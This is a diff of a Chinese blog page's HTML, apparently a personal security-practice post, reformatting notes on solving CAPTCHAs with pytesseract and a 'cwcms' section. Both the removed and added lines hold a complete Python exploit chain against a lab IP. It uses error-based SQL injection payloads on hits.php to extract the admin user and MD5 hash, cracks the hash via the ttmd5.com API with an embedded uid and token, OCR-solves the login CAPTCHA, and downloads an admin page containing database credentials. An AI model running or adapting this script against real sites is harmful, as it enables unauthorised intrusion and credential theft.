@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="tarn4">
 <meta property="og:description" content="使用pytesseract模块识别验证码">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-21T16:32:42.552Z">
+<meta property="og:updated_time" content="2018-03-21T16:33:48.880Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python识别验证码">
 <meta name="twitter:description" content="使用pytesseract模块识别验证码">
@@ -335,52 +335,23 @@
 <h3 id="使用pytesseract模块识别验证码"><a href="#使用pytesseract模块识别验证码" class="headerlink" title="使用pytesseract模块识别验证码"></a>使用pytesseract模块识别验证码</h3><ul>
 <li>报错解决：将pytesseract.py中  </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = &apos;tesseract&apos;</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">- 改为绝对路径</span><br></pre></td></tr></table></figure>
-<p>tesseract_cmd = ‘C:/Program Files (x86)/Tesseract-OCR/tesseract.exe’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 依赖tesseract的模块，需安装tesseract.</span><br><span class="line">- pytesseract和tesseract的准确度根据实际情况而定</span><br></pre></td></tr></table></figure></p>
-<p>tesseract.exe yzm.png output -l eng<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以在当前目录生成output.txt文件为验证码输出</span><br><span class="line"></span><br><span class="line">pytesseract使用方法</span><br></pre></td></tr></table></figure></p>
-<p>import pytesseract</p>
-<p>from PIL import Image</p>
-<p>image = Image.open(‘C:/Python36/Lib/site-packages/pytesseract/test.png’)</p>
-<p>vcode = pytesseract.image_to_string(image)</p>
-<p>print (vcode)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### cwcms</span><br><span class="line">- 注入拿到账号和密码的md5值后</span><br><span class="line">- 利用ttmd5.com接口解密</span><br><span class="line">- 解密后登录后台下载含有数据库密码的页面</span><br></pre></td></tr></table></figure></p>
-<p>import os<br>import requests<br>import re<br>from bs4 import BeautifulSoup</p>
-<p>def sql():<br>    user_url = ‘<a href="http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;</a><br>    user_html = requests.get(user_url)<br>    user = re.findall(r’\(.*?)\‘,user_html.text)</p>
-<pre><code>passwd_url = &apos;http://192.168.101.128/inc/hits.php?tab=cw_info&amp;id=1 union select a from(select count(*),concat(0x5c,(SELECT pass from cw_admin),0x5c,floor(rand(0)*2))x from information_schema.tables group by x)a&apos;
-passwd_html = requests.get(passwd_url)
-passwd = re.findall(r&apos;\\(.*?)\\&apos;,passwd_html.text)
-
-
-return user[0],passwd[0]
-</code></pre><p>#解密借口详情<a href="http://www.ttmd5.com/api.php?lang=cn" target="_blank" rel="noopener">http://www.ttmd5.com/api.php?lang=cn</a><br>def decode_pass(passwd):<br>    decode_url = ‘<a href="http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;" target="_blank" rel="noopener">http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;</a> + passwd<br>    html = requests.get(decode_url)<br>    a = re.match(r’\”flag\”:1’,html.text)<br>    if a == ‘None’:<br>        exit(‘decode false’)<br>    else:<br>        passwd_de = re.findall(r’plain\”:\”(.*?)\”,\”flag’,html.text)<br>        print(‘success decoded : %s’ % passwd_de[0])<br>        return passwd_de[0]</p>
-<p>def login(user,passwd):<br>    login_url = ‘<a href="http://192.168.101.128/admin/index.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/index.php&#39;</a><br>    yzm_url = ‘<a href="http://192.168.101.128/inc/code.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/code.php&#39;</a><br>    info_url = ‘<a href="http://192.168.101.128/admin/cw_web.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/cw_web.php&#39;</a></p>
-<pre><code># 请求session开始，以后的请求都会被服务端记住
-s = requests.session()
-# 保存验证码图片
-yzm = s.get(yzm_url)
-with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:
-    pic.write(yzm.content)
-    pic.close()
-# 识别验证码
-os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)
-with open(&apos;output.txt&apos;) as f:
-    str = f.read(5)
-    f.close()
-# 登录数据
-login_data = {
-    &apos;user&apos;: user,
-    &apos;pass&apos;: passwd,
-    &apos;yzm&apos;: str,
-    &apos;act&apos;: &apos;login&apos;
-}
-# 登录请求
-s.post(login_url, login_data)
-# 下载含有网站配置信息的网页
-info = s.get(info_url)
-with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:
-    info_html.write(info.content)
-    info_html.close()
-</code></pre><p>def main():<br>    user,passwd = sql()<br>    print(‘user:%s \npasswd:%s’ % (user, passwd))<br>    passwd = decode_pass(passwd)<br>    login(user,passwd)</p>
-<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()<br><code>`</code></p>
+<p>tesseract_cmd = ‘tesseract’</p>
+<p>改为绝对路径  </p>
+<p>tesseract_cmd = ‘C:/Program Files (x86)/Tesseract-OCR/tesseract.exe’</p>
+<ul>
+<li>依赖tesseract的模块，需安装tesseract.</li>
+<li>pytesseract和tesseract的准确度根据实际情况而定</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tesseract.exe yzm.png output -l eng</span><br></pre></td></tr></table></figure>
+<p>可以在当前目录生成output.txt文件为验证码输出</p>
+<p>pytesseract使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pytesseract</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">image = Image.open(&apos;C:/Python36/Lib/site-packages/pytesseract/test.png&apos;)</span><br><span class="line"></span><br><span class="line">vcode = pytesseract.image_to_string(image)</span><br><span class="line"></span><br><span class="line">print (vcode)</span><br></pre></td></tr></table></figure>
+<h3 id="cwcms-1"><a href="#cwcms-1" class="headerlink" title="cwcms"></a>cwcms</h3><ul>
+<li>注入拿到账号和密码的md5值后</li>
+<li>利用ttmd5.com接口解密</li>
+<li>解密后登录后台下载含有数据库密码的页面</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def sql():</span><br><span class="line">    user_url = &apos;http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&apos;</span><br><span class="line">    user_html = requests.get(user_url)</span><br><span class="line">    user = re.findall(r&apos;\\(.*?)\\&apos;,user_html.text)</span><br><span class="line"></span><br><span class="line">    passwd_url = &apos;http://192.168.101.128/inc/hits.php?tab=cw_info&amp;id=1 union select a from(select count(*),concat(0x5c,(SELECT pass from cw_admin),0x5c,floor(rand(0)*2))x from information_schema.tables group by x)a&apos;</span><br><span class="line">    passwd_html = requests.get(passwd_url)</span><br><span class="line">    passwd = re.findall(r&apos;\\(.*?)\\&apos;,passwd_html.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return user[0],passwd[0]</span><br><span class="line"></span><br><span class="line">#解密借口详情http://www.ttmd5.com/api.php?lang=cn</span><br><span class="line">def decode_pass(passwd):</span><br><span class="line">    decode_url = &apos;http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&apos; + passwd</span><br><span class="line">    html = requests.get(decode_url)</span><br><span class="line">    a = re.match(r&apos;\&quot;flag\&quot;:1&apos;,html.text)</span><br><span class="line">    if a == &apos;None&apos;:</span><br><span class="line">        exit(&apos;decode false&apos;)</span><br><span class="line">    else:</span><br><span class="line">        passwd_de = re.findall(r&apos;plain\&quot;:\&quot;(.*?)\&quot;,\&quot;flag&apos;,html.text)</span><br><span class="line">        print(&apos;success decoded : %s&apos; % passwd_de[0])</span><br><span class="line">        return passwd_de[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(user,passwd):</span><br><span class="line">    login_url = &apos;http://192.168.101.128/admin/index.php&apos;</span><br><span class="line">    yzm_url = &apos;http://192.168.101.128/inc/code.php&apos;</span><br><span class="line">    info_url = &apos;http://192.168.101.128/admin/cw_web.php&apos;</span><br><span class="line">    # 请求session开始，以后的请求都会被服务端记住</span><br><span class="line">    s = requests.session()</span><br><span class="line">    # 保存验证码图片</span><br><span class="line">    yzm = s.get(yzm_url)</span><br><span class="line">    with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:</span><br><span class="line">        pic.write(yzm.content)</span><br><span class="line">        pic.close()</span><br><span class="line">    # 识别验证码</span><br><span class="line">    os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)</span><br><span class="line">    with open(&apos;output.txt&apos;) as f:</span><br><span class="line">        str = f.read(5)</span><br><span class="line">        f.close()</span><br><span class="line">    # 登录数据</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        &apos;user&apos;: user,</span><br><span class="line">        &apos;pass&apos;: passwd,</span><br><span class="line">        &apos;yzm&apos;: str,</span><br><span class="line">        &apos;act&apos;: &apos;login&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    # 登录请求</span><br><span class="line">    s.post(login_url, login_data)</span><br><span class="line">    # 下载含有网站配置信息的网页</span><br><span class="line">    info = s.get(info_url)</span><br><span class="line">    with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:</span><br><span class="line">        info_html.write(info.content)</span><br><span class="line">        info_html.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    user,passwd = sql()</span><br><span class="line">    print(&apos;user:%s \npasswd:%s&apos; % (user, passwd))</span><br><span class="line">    passwd = decode_pass(passwd)</span><br><span class="line">    login(user,passwd)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -555,7 +526,7 @@ with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#cwcms"><span class="nav-number">1.</span> <span class="nav-text">cwcms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用pytesseract模块识别验证码"><span class="nav-number">2.</span> <span class="nav-text">使用pytesseract模块识别验证码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#cwcms"><span class="nav-number">1.</span> <span class="nav-text">cwcms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用pytesseract模块识别验证码"><span class="nav-number">2.</span> <span class="nav-text">使用pytesseract模块识别验证码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cwcms-1"><span class="nav-number">3.</span> <span class="nav-text">cwcms</span></a></li></ol></div>
             
 
           </div>
